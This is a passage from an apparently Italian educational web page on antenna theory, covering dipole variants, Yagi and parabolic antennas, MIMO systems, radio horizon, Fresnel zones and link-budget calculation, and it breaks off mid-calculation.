&lt;p&gt;La resistenza di radiazione si dimezza e per un’antenna filiforme diventa pari a \(R_r = 36,5 Ω\), in quanto l’antenna é costituita da un semidipolo.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna10.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;p&gt;L’antenna Marconi trova impiego prevalentemente nelle trasmissioni a frequenza relativamente bassa, in onde lunghe (&lt;strong&gt;LF&lt;/strong&gt;) e onde medie (&lt;strong&gt;MF&lt;/strong&gt;). Per ottenere un piano conduttore di caratteristiche migliori rispetto alla terra si stende sotto l’antenna, una maglia di fili di rame intrecciati, nota come contrappeso (&lt;em&gt;counterpoise&lt;/em&gt;).&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;antenna-ground-plane&#34;&gt;Antenna Ground Plane&lt;/h2&gt;
&lt;p&gt;Un&amp;rsquo;antenna Ground Plane è un tipo di antenna a dipolo in cui la radiazione avviene grazie all&amp;rsquo;assenza di una sezione del dipolo, sostituita da un piano di massa o &amp;ldquo;ground plane&amp;rdquo;. Questo piano di massa, a forma di piatto o di disco, si trova sotto l&amp;rsquo;antenna e serve come elemento di ritorno per il segnale radio.&lt;/p&gt;
&lt;p&gt;In un&amp;rsquo;antenna Ground Plane ideale, il piano di massa avrebbe un&amp;rsquo;impedenza infinita e sarebbe perfettamente orizzontale rispetto all&amp;rsquo;antenna, formando un angolo di 90 gradi rispetto alla direzione di emissione del segnale. In realtà, tuttavia, il piano di massa ha una resistenza finita e non è mai completamente orizzontale, il che può influire sulle prestazioni dell&amp;rsquo;antenna.&lt;/p&gt;
&lt;p&gt;Per quanto riguarda i valori resistivi, la resistenza del piano di massa dipende dal materiale utilizzato, dalle dimensioni e dalla forma. Solitamente si cerca di utilizzare materiali con alta conduttività, come il rame o l&amp;rsquo;alluminio, per minimizzare la resistenza. Tuttavia, la resistenza del piano di massa può comunque variare a seconda delle condizioni ambientali, come la presenza di umidità o di contaminanti.&lt;/p&gt;
&lt;p&gt;L&amp;rsquo;angolo formato dal piano di massa dipende dalla geometria dell&amp;rsquo;antenna e dalle esigenze di progetto. In generale, l&amp;rsquo;angolo deve essere tale da massimizzare il guadagno dell&amp;rsquo;antenna nella direzione di emissione del segnale e minimizzare il guadagno nelle direzioni indesiderate. Solitamente, l&amp;rsquo;angolo varia tra i 30 e i 60 gradi rispetto all&amp;rsquo;orizzontale.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;antenne-caricate&#34;&gt;Antenne Caricate&lt;/h2&gt;
&lt;p&gt;Le antenne caricate sono antenne che utilizzano un&amp;rsquo;induttanza o un condensatore per modificare le loro proprietà elettriche, in modo da adattarsi meglio alle specifiche esigenze di progetto. La carica, che è una reattanza, può essere utilizzata per vari scopi, come la riduzione delle dimensioni dell&amp;rsquo;antenna, la regolazione dell&amp;rsquo;impedenza di ingresso o la focalizzazione della radiazione in determinate direzioni.&lt;/p&gt;
&lt;p&gt;Ad esempio, un&amp;rsquo;antenna a filo rettilineo lunga a λ/4 può essere carica in modo da apparire come un&amp;rsquo;antenna più corta, ma con le stesse proprietà elettriche. Ciò consente di ottenere una riduzione delle dimensioni fisiche dell&amp;rsquo;antenna, senza comprometterne le prestazioni.&lt;/p&gt;
&lt;p&gt;Inoltre, le antenne caricate possono essere utilizzate per adattare l&amp;rsquo;impedenza di ingresso dell&amp;rsquo;antenna alla sorgente del segnale. Questo può essere utile, ad esempio, quando l&amp;rsquo;antenna è collegata a un amplificatore o a un ricevitore con un&amp;rsquo;impedenza diversa da quella dell&amp;rsquo;antenna. In questo caso, l&amp;rsquo;antenna viene carica in modo da presentare un&amp;rsquo;impedenza di ingresso compatibile con quella della sorgente del segnale.&lt;/p&gt;
&lt;p&gt;Infine, le antenne caricate possono essere utilizzate per focalizzare la radiazione in determinate direzioni. Ciò può essere ottenuto utilizzando carichi di induttanza o di capacità in modo selettivo, in modo da modificare la distribuzione della corrente lungo l&amp;rsquo;antenna e quindi la direzione di emissione del segnale.&lt;/p&gt;
&lt;p&gt;In sintesi, le antenne caricate sono un&amp;rsquo;importante tecnologia che consente di adattare le proprietà elettriche delle antenne alle specifiche esigenze di progetto, per ottenere prestazioni ottimali in diverse applicazioni.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;dipolo-ripiegato-folded-dipole-e-antenne-a-banda-larga&#34;&gt;Dipolo ripiegato (folded dipole) e antenne a banda larga&lt;/h2&gt;
&lt;p&gt;Un’altra variante del dipolo \( \lambda/2\) é costituita dal dipolo ripiegato (folded dipole). Quest’antenna realizzata congiungendo gli estremi di un dipolo \( \lambda/2\) con un conduttore parallelo a esso per simulare un dipolo \( \lambda/2\) avente un diametro del conduttore piú grande.&lt;/p&gt;
&lt;p&gt;Poiché la banda di un dipolo aumenta con l’aumentare del diametro del conduttore, il dipolo ripiegato é un’antenna a banda larga utilizzata come elemento base delle antenne riceventi TV.&lt;/p&gt;
&lt;p&gt;Il guadagno rimane lo stesso del dipolo \( \lambda/2\), la resistenza di radiazione quadruplica arricando a circa \(R_r = 300 Ω\). Questa antenna puó essere usata da sola oppure puó costituire l’elemento radiante di antenne piú complesse, come le antenne riceventi TV di tipo Yagi.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;antenne-direttive&#34;&gt;Antenne direttive&lt;/h1&gt;
&lt;p&gt;Un’antenna che concentra la maggior parte della potenza irradiata lungo una direttrice ben precisa, viene definita &lt;strong&gt;direttiva unidrezionale&lt;/strong&gt;, o piú semplicemente &lt;strong&gt;direttiva&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Le antenne direttive hanno le seguenti caratteristiche salienti:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Guadagno piú alto;&lt;/li&gt;
&lt;li&gt;Non irradiano nelle aree che non interessa servire;&lt;/li&gt;
&lt;li&gt;L’antenna é adatta per collegamenti di tipo punto-punto;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Un parametro importante per le antenne direttive é l’FBR (&lt;em&gt;Front-to-Back Ratio&lt;/em&gt;), che ne definisce il grado di unidirezionalitá. Piú alto é l’FBR e maggiore sará l’unidirezionalitá dell’antenna.&lt;/p&gt;
&lt;p&gt;Diagramma di radiazione di un’antenna direttiva undirezionale Yagi:&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna11.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;hr&gt;
&lt;h2 id=&#34;angolo-di-apertura-del-fascio-beamwidth-o-angolo-di-radiazione&#34;&gt;Angolo di apertura del fascio (beamwidth) o angolo di radiazione&lt;/h2&gt;
&lt;p&gt;Viene definito &lt;strong&gt;angolo di apertura a 3 dB&lt;/strong&gt; (&lt;em&gt;beamwidth&lt;/em&gt;), o &lt;strong&gt;angolo di radiazione di un’antenna&lt;/strong&gt; (\( \theta\) ), l’angolo indiviato dai due punto sul diagramma di radiazione in cui il grafico diminuisce di 3 dB rispetto al valore che si ha nella direzione di massimo irraggiamento.&lt;/p&gt;
&lt;p&gt;Nelle due direzioni individuate dall’angolo \( \theta\) la densitá di potenza, \(S\), si dimezza, rispetto al valore nella direzione di massimo irraggiamento, e di conseguenza il campo elettrico, \(E\), diviene pari a \(E = E_{max \space IRR} / \sqrt{2}\).&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;front-to-back-ratio-rapporto-avantidietro&#34;&gt;Front-to-Back Ratio (rapporto avanti/dietro)&lt;/h2&gt;
&lt;p&gt;Il &lt;strong&gt;Front-to-Back Ratio&lt;/strong&gt; (&lt;strong&gt;FBR&lt;/strong&gt;), o &lt;em&gt;rapporto avanti/dietro&lt;/em&gt;, esprime il grado di unidrezionalitá di un’antenna direttiva.&lt;/p&gt;
&lt;p&gt;L’FBR é espresso in decibel ed é pari alla differenza tra il guadagno (normalizzato) nella direzione di massima irradiazione (\( 0\degree\)) e il guadagno (normalizzato) che si ha nella direzione opposta (a \(180\degree\)gradi):&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}FBR = G (0\degree) - G (180\degree)
$$&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;antenna-yagi&#34;&gt;Antenna Yagi&lt;/h2&gt;
&lt;p&gt;Un’antenna direttiva puó essere realizzata affiancando a un dipolo \( \lambda/2\)  degli &lt;em&gt;elementi passivi&lt;/em&gt;. Un elemento passivo é un conduttore, avente lunghezza appropriata, che viene posta nelle immediate vicinanze dell’elemento radiante. L’elemento passivo intercetta una parte dell’energia irradiata e a sua volta la reirradia.&lt;/p&gt;
&lt;p&gt;L’antenna Yagi é composta da:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un elemento attivo costituito da un dipolo \( \lambda/2\)&lt;/li&gt;
&lt;li&gt;Un elemento passivo detto &lt;em&gt;riflettore&lt;/em&gt;, avenete lunghezza maggiore di \( \lambda/2\) che riflette le onde elettromagnetiche nella direzione desiderata;&lt;/li&gt;
&lt;li&gt;Uno o piú elementi passivi, detti &lt;em&gt;direttori&lt;/em&gt;, che hanno lunghezza minore di \( \lambda/2\) i quali concentrano la potenza irradiata nella direzione desiderata.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Facendo un’analogia ottica, il &lt;em&gt;riflettore&lt;/em&gt; si comporta come uno specchio, mentre i &lt;em&gt;direttori&lt;/em&gt; si comportano come delle lenti convergenti.&lt;/p&gt;
&lt;p&gt;L’antenna Yagi é molto utilizzata come antenna ricevenete TV. Il riflettore tubolare puó essere sostituito da un riflettore formato da un diedro di materiale condutttore, sulla cui bisettrice viene posto il dipolo attivo. Si realizza cosí l’&lt;em&gt;antenna a diedro&lt;/em&gt; o &lt;em&gt;corner riflector&lt;/em&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;antenna-collineari-e-a-cortina&#34;&gt;Antenna collineari e a cortina&lt;/h2&gt;
&lt;p&gt;Un modo per aumentare la direttivitiá e il guadagno di un’antenna é quello di utilizzare sistemi radianti costituiti da un certo numero ($N$) di dipoli \( \lambda/2\) allineati e alimentati. Se i dipoli sono disposti sullo stesso asse si ottiene un’antenna collineare o &lt;strong&gt;allineamento (array) collineare&lt;/strong&gt;, mentre se i dipoli sono disposti a matrice su un piano si ottiene una &lt;strong&gt;cortina di dipoli&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;In tal modo il guadagno rispetto al dipolo \( \lambda/2\), espresso in dBd, diventa pari a \(G = 10\log_{10}N  d Bd\).&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;puntamento-delle-antenne-direttive&#34;&gt;Puntamento delle antenne direttive&lt;/h2&gt;
&lt;p&gt;Nel caso di collegamenti che impiegano antenne direttive, é importante conoscere il diagramma di radiazione per poter puntare correttamente l’antenna, cioé per posizionarla nella direzione in cui l’antenna capta meglio. Un errato puntamento dell’antenna causa una diminuzione del segnale fornito in uscita dall’antenna stessa, che puó anche annullarsi.&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna12.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;hr&gt;
&lt;h1 id=&#34;antenne-a-superficie&#34;&gt;Antenne a superficie&lt;/h1&gt;
&lt;p&gt;Quando si opera nel campo delle microonde (UHF, SHF, EHF) le onde radio possono essere considerate come dei raggi che é possibile riflettere e focalizzare tramite superfici di forma e materiale opprtuni.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;antenna-parabolica&#34;&gt;Antenna parabolica&lt;/h2&gt;
&lt;p&gt;Nel campo dell’illuminazione per ottenere uno stretto fascio luminoso é possibile utilizzare riflettori parabolici, ponendo una sorgente luminosa nel punto focale di una superficie riflettente a forma di paraboloide.&lt;/p&gt;
&lt;p&gt;Se l’irradiazione di una sorgente, posta nel punto focale, viene riflessa da una superficie costituita da un paraboloide, la potenza irradiata viene concentrata in un fascio molto stretto lungo la direzione di propagazione, ottenendo cosí un elevato guadagno.&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna13.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;p&gt;I diagrammi di radiazione nei piani \(H\) ed \(E\) mostrano un lobo principale molto pronunciato, con un angolo di apertura molto piccolo, che denota un elevato guadagno.&lt;/p&gt;
&lt;p&gt;Per il principio di reciprocitá l’antenna conserva le sue proprietá anche quando viene usata come antenna ricevente. Il guadagno delle antenne paraboliche arriva a valori molto alti, anche 60 dB per antenne di grandi dimensioni.&lt;/p&gt;
&lt;p&gt;L’illuminazione della superficie parabolica, cioé l’irradiazione delle onde elettromagnetiche verso la superficie riflettente, puó essere realizzata in vari modi:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un’antenna vera e propria posta nel fuoco della parabola;&lt;/li&gt;
&lt;li&gt;Una guida d’onda tronca o terminata a tromba posta nel fuoco della parabola;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;L’illuminazione non é uniforme, ma decresce verso i bordi, l’illuminatore tende a illuminare meglio il centro. Per questo motivo si definisce l’efficienza, \( \eta\), di un’antenna parabolica come il rapporto tra l’area equivalente ( \(A_{eq}\) ), o area efficace e l’area geometrica ( \(A_g\) ) dell’antenna in esame: \( \eta = A_{eq} / A_g\). Normalmente si ha \(0,5 &amp;lt; \eta &amp;lt; 0,8\); in mancanza di dati certi si puó assumere il valore tipico \( \eta = 0,65\).&lt;/p&gt;
&lt;p&gt;Il guadagno di una antenna parabolica dipende dalla sua efficienza, dal suo diametro ( \(D_a\) ) e dalla lughezza d’onda del segnale captato o irradiato secondo la seguente relazione:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}G = 10 \log_{10} \eta \begin{pmatrix} \dfrac{\pi * D_a}{\lambda} \end{pmatrix}^2 ; [dB]
$$&lt;/p&gt;
&lt;p&gt;L’angolo di apertura a 3 dB (beamwidth) di un’antenna parabolica si puó calcolare come:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}\theta\degree \approx 70 \dfrac{\lambda_{[m]}}{D_{a[m]}}
$$&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;parabola-offset&#34;&gt;Parabola offset&lt;/h2&gt;
&lt;p&gt;Le parabole che hanno l’illuminatore nel fuoco vengono denominate &lt;em&gt;prime focus&lt;/em&gt;. Per limitare le interferenze sono state realizzate parabole denominate &lt;em&gt;offset&lt;/em&gt; le quali sono costituite da una sezione di un paraboloide che punta verso un illuminatore posto nel fuoco, il quale però non è al centro dell’antenna bensì in posizione sottostante.&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna14.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;hr&gt;
&lt;h2 id=&#34;antenne-paraboliche-per-la-ricezione-tv-da-satellite&#34;&gt;Antenne paraboliche per la ricezione TV da satellite&lt;/h2&gt;
&lt;p&gt;L’antenna parabolica costituisce un’antenna direttiva ad alto guadagno utilizzata anche per la ricezione di segnali TV da satellite (sistema DVB-S, Digital Video Broadcasting-Satellite).&lt;/p&gt;
&lt;p&gt;In questo caso sia perché l’intensità del segnale ricevuto è estremamente debole, sia perché la frequenza del segnale ricevuto è molto elevata, viene montato direttamente sulla parabola un dispositivo denominato LNB (&lt;em&gt;Low Noise Black converter&lt;/em&gt;), collegato all’antenna ricevente vera e propria e a un polarizzatore, per discriminare il segnale in base alla sua polarizzazione.&lt;/p&gt;
&lt;p&gt;L’LNB è composto fondamentalmente da tre parti:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LNA (&lt;em&gt;Low Noise Amplifer&lt;/em&gt;): è un amplificatore che eleva il livello del segnale RF ricevuto;&lt;/li&gt;
&lt;li&gt;Mixer o down converter: ha il compito di abbassare la frequenza del segnale captato portandola dalla radio frequenza a una frequenza detta &lt;em&gt;frequenza intermedia&lt;/em&gt; (FI);&lt;/li&gt;
&lt;li&gt;Filtro passa banda e amplificatore a FI: per eliminare le frequenze indesiderate e amplificare il segnale a FI prima di inviarlo sul cavo coassiale;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;parabola-cassegrain&#34;&gt;Parabola Cassegrain&lt;/h2&gt;
&lt;p&gt;È un tipo di antenna parabolica, che ha un diverso sistema di illuminazione, l’illuminatore, costituito da una guida d’onda tronca (feed horn), è posto al centro della parabola e punta su una superficie riflettente secondaria, denominata &lt;em&gt;subriflettore&lt;/em&gt;, avente la forma di un iperboloide di rotazione, in questo modo si ottiene un’illuminazione più uniforme.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;sistemi-di-antenna-mimomultiple-in-multiple-out&#34;&gt;Sistemi di antenna MIMO(Multiple In Multiple Out)&lt;/h1&gt;
&lt;p&gt;In alta frequenza, i sistemi d’antenna possono impiegare una o piú antenne e possono essere suddivisi nei seguenti sistemi:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SISO (&lt;em&gt;Serial In Serial Out&lt;/em&gt;): sono i sistemi che utilizzano un’antenna lato trasmissione e un’antenna lato ricezione; sono sistemi adatti a operare quando l’ambiente é assimilabile allo spazio libero.&lt;/li&gt;
&lt;li&gt;SIMO (&lt;em&gt;Serial In Multiple Out&lt;/em&gt;): sono i sistemi che operano lato ricezione con due antenne riceventi, per implementare la tecnica della diversitá di spazio; sono adatti a operare quando il ricevitore é posto in un ambiente in cui vi sono oggetti che causano riflessioni.&lt;/li&gt;
&lt;li&gt;MISO (&lt;em&gt;Multiple In Serial Out&lt;/em&gt;): sono un’alternativa ai sistemi SIMO, in cui si utilizzano due antenne trasmittenti e un’antenna ricevente.&lt;/li&gt;
&lt;li&gt;MIMO (&lt;em&gt;Multiple In Multiple Out&lt;/em&gt;): sono i sistemi piú moderni che utilizzano contemporaneamente due o piú antenne in trasmissione e due o piú antenne in ricezione. Sono sistemi che trasmettono e ripartiscono il flusso di bit in ingresso su piú segnali modulati inviati in parallelo alle antenne trasmittenti; i segnali vengono captati dalle antenne riceventi e con sofisticate tecniche di elaborazione digitale dei segnali (DSP) sono demodulati e viene riassemblato il flusso id bit originario; i sistemi MIMO consentono di aumentare la capacitá trasmissiva di un sistema all’aumentaredel minimo tra (&lt;em&gt;m&lt;/em&gt;, &lt;em&gt;n&lt;/em&gt;), dove &lt;em&gt;m&lt;/em&gt; é il numero di antenne usate in trasmissione e &lt;em&gt;n&lt;/em&gt; é il numero di antenne usate in ricezione; possono operare in maniera piú efficace in ambienti in cui vi sono molte riflessioni in quanto sono in grado di compensare le differenze di fase fra i vari percorsi e quindi di sfruttare positivamente i segnali riflessi. I sistemi MIMO sono impiegati nei sistemi di comunicazione radio piú moderni; apparati WiFi (802.11n), sistemi di accesso wireless a banda larga (WiMAX), sistemi per la comunicazione in mobilitá di ultima generazione (LTE, Long Term Evolution).&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna15.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;hr&gt;
&lt;h1 id=&#34;installazione-dei-sistemi-di-antenna&#34;&gt;Installazione dei sistemi di antenna&lt;/h1&gt;
&lt;p&gt;Quando si opera a frequena elevate (bande VHF/UHF/SHF) le onde elettromagnetiche si propagano per onda diretta, propagazione detta anche in visibilitá ottica (&lt;em&gt;Line Of Sight&lt;/em&gt; - &lt;em&gt;LoS&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Questo tipo di propagazione richiede che le antenne tramittenti e riceventi siano (quasi) visibili l’una all’altra, in quanto le onde elettromagnetiche viaggiano direttamente dall’antenna trasmittente all’antenna ricevente.&lt;/p&gt;
&lt;p&gt;Nello spazio libero i percorsi seguiti sarebbero rettilinei, mentre nell’atmosfera essi risentono delle disomogeneitá del mezzo.&lt;/p&gt;
&lt;p&gt;In condizioni normali (&lt;em&gt;atmosfera standard&lt;/em&gt;) le disomogeneitá causano delle rifrazioni facendo sí che il percorso seguito da un’onda elettromagnetica sia all’incirca un &lt;strong&gt;arco di cerchio&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;In situazioni anomale si possono avere rifrazioni diverse, fenomi di riflessione, diffrazioni e assorbimento, che causano ulteriori perdite. Tali fenomeni avvegono nella troposfera in quanto la stratosfera e la ionosfera a queste frequenze si possono considerare sostanzialmente simili allo spazio libero.&lt;/p&gt;
&lt;p&gt;I calcoli relativi all’installazione e al posizionamento delle antenne sono semplificati se si considerano i percorsi come rettilinei. a tale scopo si tiene conto del fatto che in realtá i percorsi sono archi di cerchio, introducendo cosí il concetto di &lt;em&gt;terra equivalente&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La &lt;strong&gt;terra equivalente&lt;/strong&gt; é una superficie terrestre fittizzia in cui si possono considerare i percorsi delle onde elettromagnetiche come rettilinei.&lt;/p&gt;
&lt;p&gt;Il raggio della terra equivalente si ottiene moltiplicando il raggio effettivo della terra per un fattore $k$ (&lt;em&gt;effective earth radius factor&lt;/em&gt;), che per l’atmosfera standard vale \(k = 4/3 \approx 1,33\), per cui si ha \(R_{eq} = k * R_0 = 4/3 * 6367 \approx 8490\) km.&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna16.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;hr&gt;
&lt;h2 id=&#34;orizzonte-radio-e-massima-distanza-fra-due-antenne&#34;&gt;Orizzonte radio e massima distanza fra due antenne&lt;/h2&gt;
&lt;p&gt;L’orizzonte radio di un’antenna trasmittente, posta a un’altezza \(h_{TX}\) (m) dal suolo, é la massima distanza, \(d_{TX}\) (in km) a cui l’altezza é in visibilitá radio con un’antenna posta a livello del suolo.&lt;/p&gt;
&lt;p&gt;In un ambiente privo di ostacoli l’orizzonte radio risulta pari a:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}d_{TX} \approx 4,12 \sqrt{h_{TX [m]}} ; [km]
$$&lt;/p&gt;
&lt;p&gt;L’orizzonte radio é piú grande dell’orizzonte visivo in quanto le onde elettromagnetiche compiono dei percorsi che sono archi di cerchio.&lt;/p&gt;
&lt;p&gt;In un ambiente privo di ostacoli la massima distanza \(d_{max}\) é pari alla somma degli orizzonti radio e si puó calcolare come:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}d_{max} = d_{TX} + d_{RX} \approx 4,12 (\sqrt{h_{TX_[m]}} + \sqrt{h_{RX_[m]}}) ; [km]
$$&lt;/p&gt;
&lt;p&gt;Quando le condizioni dell’atmosfera non sono quelle standard varia la curvatura della traiettoria del raggio. Si definiscono cosi le seguenti due condizioni:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;subrifrazione&lt;/em&gt;, quando \(k &amp;lt; 4/3\) e la curvatura é inferiore rispetto alla condizione standard; l’onda elettromagnetica (raggio) devia verso l’alto rispetto alla traiettoria standard;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;superrifrazione&lt;/em&gt;, quando \(k &amp;gt; 4/3 \); la curvatura é maggiore di quella standard; l’onda elettromagnetica (raggio) devia verso il basso rispetto alla traiettoria standard.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Queste situazioni possono comportare una diminuzione anche forte della potenza di segnale che giunge all’antenna ricevente e si configurano come una forma di fading.&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna17.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;hr&gt;
&lt;h2 id=&#34;perdite-per-diffrazione-e-prima-zona-di-fresnel&#34;&gt;Perdite per diffrazione e prima zona di Fresnel&lt;/h2&gt;
&lt;p&gt;Quando in un collegamento radio il terreno (o un ostacolo di dimensione &amp;raquo; \( \lambda\) ) risulta vicino alla linea fittizzia che congiunge l’antenna trasmittente con quella ricevente intervengono fenomeni di diffrazione che riducono la potenza del segnale ricevuto.&lt;/p&gt;
&lt;p&gt;La maggior parte della potenza giunge all’antenna ricevente viaggia in una zona dello spazio denominata &lt;strong&gt;prima zona di Fresnel&lt;/strong&gt;, individuata da un eliissoide di ratoazione detto &lt;strong&gt;ellisoide di Fresnel&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Il raggio massimo dell’ellissoide di Fresnel si ha quando \(d_1 = d_2 = d/2\), il raggio massimo dell’ellissoide di Fresnel risulta pari a:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}r_{max} =  8,66 \sqrt{\dfrac{d_{km}}{f_{GHz}}} ; [m]
$$&lt;/p&gt;
&lt;p&gt;Le perdite per diffrazione sono trascurabili solo se la prima zona di Fresnel risulta libera da ostacoli. Quindi l’altezza delle torri o dei tralicci viene calcolata imponendo che eventuali ostacoli risultino posti a distanze maggiori di \(r_{max}\).&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna18.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;hr&gt;
&lt;h1 id=&#34;dimensionamento-di-un-collegamento-radio&#34;&gt;Dimensionamento di un collegamento radio&lt;/h1&gt;
&lt;p&gt;È necessario fare il bilancio di potenza di un collegamento, o &lt;em&gt;link (power) budget&lt;/em&gt;, per calcolare qual è il livello di potenza che si fornisce in ingresso al primo amplificatore in ricezione.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;bilancio-di-potenza-link-budget-di-un-collegamento-radio&#34;&gt;Bilancio di potenza (link budget) di un collegamento radio&lt;/h2&gt;
&lt;p&gt;Il bilancio di potenza di un collegamento radio è una relazione matematica che lega il livello di potenza con cui opera il trasmettitore al livello di potenza che si ha in ingresso al ricevitore, sommando tutti i guadagni e sottraendo tutte le attenuazioni che sono presenti fra uscita del trasmettitore e ingresso del ricevitore:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}L_{PRX} = L_{PTX[dBm \ (o \ dBW)]} + \sum Guadagni_{[dB]} - \sum Attenuazioni_{[dB]} ; dBm\ (o \ DBW)
$$&lt;/p&gt;
&lt;p&gt;Spesso si preferisce spezzare il bilancio di potenza in due parti:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Calcolo dell’EIRP del sistema tramittente, sottraendo al livello di potenza del trasmettitore ( \(L_{PTX}\) ) l’attenuazione del feeder (cavo) \(A_F\) in dB, e sommando il guadagno dell’antenna trasmittente ( \(G_T\) in dBi);&lt;/li&gt;
&lt;li&gt;Si calcola il livello in ricezione sottraendo all’EIRP l’attenuazione del collegamento radio, tenendo conto dell’attenuazione dello spazio libero ( \(A_{sl}\) ) dell’eventuale attenuazione supplementare (\( A_{suppl}\) ), sommando il guadagno dell’antenna ricevente e sottranendo l’attenuazione dell’eventuale feeder (cavo), \(A_F\).&lt;/li&gt;
&lt;/ol&gt;
&lt;div style=&#34;text-align: center;&#34;&gt;
  &lt;div style=&#34;display: inline-block; text-align: left; font-size: 18px;&#34;&gt;
    $$
    \begin{cases}
      EIRP = L_{PTX}[dBm \ (o \ dBW)] - A_{F}[dB] + G_{T}[dBm \ (o \ dBW)] \\
      L_{PRX} = EIRP - [A_{sl} + A_{suppl} + M_L] + G_R - A_F \; [dBm \ (o \ dBW)]
    \end{cases}
    $$
  &lt;/div&gt;
&lt;/div&gt;
&lt;hr&gt;
&lt;h2 id=&#34;calcolo-del-livello-in-ricezione&#34;&gt;Calcolo del livello in ricezione&lt;/h2&gt;
&lt;p&gt;Per calcolare il livello in ricezione si procede nel seguente modo:&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna19.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Determiniamo l’EIRP del sistema trasmittente.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Calcoliamo il livello di potenza del trasmettitore esprimendo la potenza in \( mW \) e applicando la relazione:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}L_{PTX} = 10\log_{10} \ P_{TX[mW]}  [dBm]
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Calcoliamo l’attenuazione del cavo coassiale (feeder), l’attenuazione per unità di lunghezza (\( \alpha \)) e la sua lunghezza ( \(l\) ) come:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}A_F = \alpha * l  [dB]
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Noto il tipo di antenna e le sue caratteristiche si determina il guadagno ( \(G_T\), in \(dBi\), o semplicemente in $dB$ per le antenne paraboliche).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Si calcola l’EIRP:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}EIRP
= L_{PTX [dBm]} - A_{F[dB]} + G_{T[dB]}  [dBm]
$$&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Determiniamo l’attenuazione del collegamento radio.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Calcoliamo l’attenuazione dello spazio libero ( \(A_{sl}\) ) e la distanza fra le antenne \((r)\) in km:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}A_{sl} = 32,5 + 20\log_{10} f_{MHz} + 20\log_{10} ; r_{km} [dB]
$$&lt;/p&gt;
